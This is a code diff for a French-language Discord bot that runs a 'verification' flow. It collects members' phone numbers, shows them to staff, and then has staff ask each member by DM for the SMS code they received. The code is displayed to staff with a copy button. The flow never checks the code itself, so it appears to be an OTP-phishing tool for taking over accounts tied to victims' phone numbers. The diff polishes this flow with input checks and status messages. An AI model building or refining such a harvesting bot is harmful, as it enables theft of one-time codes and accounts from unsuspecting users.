@@ -34,7 +34,7 @@ TANA_PINK = discord.Color.from_rgb(255, 153, 153)
 # --- MODAL POUR QUE LE MEMBRE ENTRE SON NUMÉRO ---
 class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
     phone_input = discord.ui.TextInput(
-        label="Entre ton numéro",
+        label="Entre ton numéro (10 chiffres)",
         placeholder="Ex: 0612345678",
         min_length=10,
         max_length=10,
@@ -50,21 +50,30 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de
 
         await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)
 
+        try:
+            embed_mp = discord.Embed(
+                title="📩 Demande reçue",
+                description="Ta demande a bien été transmise au staff.\nTu recevras ici la suite dès qu'un membre du staff te demandera ton code.",
+                color=TANA_PINK
+            )
+            await interaction.user.send(embed=embed_mp)
+        except Exception:
+            pass
+
         staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
         if staff_channel:
             embed = discord.Embed(
-                title="VÉRIFICATION",
+                title="📋 DOSSIER DE VÉRIFICATION",
                 color=TANA_PINK
             )
             
-            embed.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
-            embed.add_field(name="ID", value=f"`{interaction.user.id}`", inline=False)
-            embed.add_field(name="Opérateur (préfixe)", value="**Inconnu**", inline=False)
-            embed.add_field(name="Numéro", value=f"`{numero}`", inline=False)
-            embed.add_field(name="🟢 Présence", value="✅ Toujours dans le serveur", inline=False)
-            embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=False)
+            embed.add_field(name="👤 Utilisateur", value=f"{interaction.user.mention}", inline=True)
+            embed.add_field(name="🆔 ID", value=f"`{interaction.user.id}`", inline=True)
+            embed.add_field(name="📞 Numéro", value=f"`{numero}`", inline=False)
+            embed.add_field(name="🟢 Présence", value="✅ Sur le serveur", inline=True)
+            embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=True)
             
-            embed.set_footer(text=f"{interaction.guild.name} · Espace Makeur")
+            embed.set_footer(text=f"{interaction.guild.name} · Système de Sécurité Tanalounge")
 
             view = VerificationView(numero=numero, user_id=interaction.user.id)
             msg = await staff_channel.send(embed=embed, view=view)
@@ -84,7 +93,7 @@ class PublicVerifyView(discord.ui.View):
 # --- MODAL POUR QUE LE JOUEUR ENTRE SON CODE EN MP ---
 class PlayerCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
     code_input = discord.ui.TextInput(
-        label="Code SMS reçu",
+        label="Code SMS reçu (Chiffres uniquement)",
         placeholder="Ex: 4829",
         min_length=3,
         max_length=10,
@@ -98,8 +107,11 @@ class PlayerCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
 
     async def on_submit(self, interaction: discord.Interaction):
         code_saisi = self.code_input.value
+
+        if not code_saisi.isdigit():
+            await interaction.response.send_message("❌ Le code SMS ne doit contenir **que des chiffres**, sans lettres ni espaces.", ephemeral=True)
+            return
         
-        # Confirmation en MP au joueur
         embed_mp = discord.Embed(
             title="✅ Code transmis",
             description=f"Ton code (`{code_saisi}`) a bien été envoyé au staff. Patiente pendant la vérification.",
@@ -107,17 +119,11 @@ class PlayerCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
         )
         await interaction.response.send_message(embed=embed_mp, ephemeral=True)
 
-        # Mise à jour du message dans le salon staff
         embed_staff = self.staff_message.embeds[0]
-        champ_trouve = False
         for i, field in enumerate(embed_staff.fields):
             if "Code SMS" in field.name:
-                embed_staff.set_field_at(i, name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=False)
-                champ_trouve = True
+                embed_staff.set_field_at(i, name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=True)
                 break
-        
-        if not champ_trouve:
-            embed_staff.add_field(name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=False)
 
         await self.staff_message.edit(embed=embed_staff, view=self.staff_view)
 
@@ -141,16 +147,6 @@ class VerificationView(discord.ui.View):
         self.user_id = user_id
         self.claimed_by = None
 
-    def update_buttons_state(self):
-        """Désactive tout sauf Claim si non claimé, ou bloque les autres si claimé par quelqu'un d'autre"""
-        for child in self.children:
-            if child.custom_id and "claim_btn" in child.custom_id:
-                continue  # Le bouton claim gère son propre état
-            if self.claimed_by is None:
-                child.disabled = True
-            else:
-                child.disabled = False
-
     @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn_dynamic")
     async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by is not None and self.claimed_by != interaction.user.id:
@@ -165,7 +161,6 @@ class VerificationView(discord.ui.View):
         button.label = f"Claimé par {interaction.user.name}"
         button.disabled = True
         
-        # Active les boutons pour le membre du staff qui a claim
         for child in self.children:
             if not ("claim_btn" in child.custom_id):
                 child.disabled = False
@@ -179,7 +174,6 @@ class VerificationView(discord.ui.View):
             await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
             return
         
-        # Envoi du MP au joueur
         try:
             member = interaction.guild.get_member(self.user_id) or await interaction.guild.fetch_member(self.user_id)
             embed_mp = discord.Embed(
@@ -191,7 +185,7 @@ class VerificationView(discord.ui.View):
             await member.send(embed=embed_mp, view=view_mp)
             await interaction.response.send_message("✅ Le message de demande de code a été envoyé en MP au joueur.", ephemeral=True)
         except Exception as e:
-            await interaction.response.send_message(f"❌ Impossible d'envoyer un MP au joueur (ses MP sont sûrement fermés). Erreur : {e}", ephemeral=True)
+            await interaction.response.send_message(f"❌ Impossible d'envoyer un MP au joueur (ses MP sont fermés). Erreur : {e}", ephemeral=True)
 
     @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn_dynamic", disabled=True)
     async def copy_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -206,11 +200,31 @@ class VerificationView(discord.ui.View):
             await interaction.response.send_message("❌ Vous ne pouvez pas valider ce dossier !", ephemeral=True)
             return
         
+        # Désactive tous les boutons
         for child in self.children:
             child.disabled = True
+
+        # Met à jour l'embed du salon staff (passe en vert)
+        embed = interaction.message.embeds[0]
+        embed.color = discord.Color.green()
+        embed.title = "✅ DOSSIER ACCEPTÉ"
+        embed.add_field(name="📌 Statut", value=f"Accepté par {interaction.user.mention}", inline=False)
         
-        await interaction.response.edit_message(view=self)
-        await interaction.followup.send("✅ Vérification acceptée avec succès.", ephemeral=True)
+        await interaction.message.edit(embed=embed, view=self)
+
+        # Envoi d'un MP au joueur pour l'informer
+        try:
+            member = interaction.guild.get_member(self.user_id) or await interaction.guild.fetch_member(self.user_id)
+            embed_mp = discord.Embed(
+                title="✅ Vérification réussie",
+                description="Ta demande de vérification a été **acceptée** par le staff. Bienvenue !",
+                color=discord.Color.green()
+            )
+            await member.send(embed=embed_mp)
+        except Exception:
+            pass
+
+        await interaction.response.send_message("✅ Vérification acceptée avec succès.", ephemeral=True)
 
     @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, emoji="✖", custom_id="refuse_btn_dynamic", disabled=True)
     async def refuse_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -218,16 +232,36 @@ class VerificationView(discord.ui.View):
             await interaction.response.send_message("❌ Vous ne pouvez pas refuser ce dossier !", ephemeral=True)
             return
         
+        # Désactive tous les boutons
         for child in self.children:
             child.disabled = True
+
+        # Met à jour l'embed du salon staff (passe en rouge)
+        embed = interaction.message.embeds[0]
+        embed.color = discord.Color.red()
+        embed.title = "❌ DOSSIER REFUSÉ"
+        embed.add_field(name="📌 Statut", value=f"Refusé par {interaction.user.mention}", inline=False)
+        
+        await interaction.message.edit(embed=embed, view=self)
+
+        # Envoi d'un MP au joueur pour l'informer
+        try:
+            member = interaction.guild.get_member(self.user_id) or await interaction.guild.fetch_member(self.user_id)
+            embed_mp = discord.Embed(
+                title="❌ Vérification refusée",
+                description="Ta demande de vérification a été **refusée** par le staff.",
+                color=discord.Color.red()
+            )
+            await member.send(embed=embed_mp)
+        except Exception:
+            pass
             
-        await interaction.response.edit_message(view=self)
-        await interaction.followup.send("❌ Vérification refusée.", ephemeral=True)
+        await interaction.response.send_message("❌ Vérification refusée.", ephemeral=True)
 
 @bot.event
 async def on_ready():
     bot.add_view(PublicVerifyView())
-    print(f"Bot connecté en tant5 que {bot.user} et vues persistantes chargées.")
+    print(f"Bot connecté en tant que {bot.user} et vues persistantes chargées.")
 
 @bot.event
 async def on_member_remove(member):
@@ -238,7 +272,7 @@ async def on_member_remove(member):
             embed.color = discord.Color.from_rgb(231, 76, 60)
             for i, field in enumerate(embed.fields):
                 if "Présence" in field.name:
-                    embed.set_field_at(i, name="🔴 Présence", value="❌ A quitté le serveur", inline=False)
+                    embed.set_field_at(i, name="🔴 Présence", value="❌ A quitté le serveur", inline=True)
                     break
             await message.edit(embed=embed)
         except Exception as e:
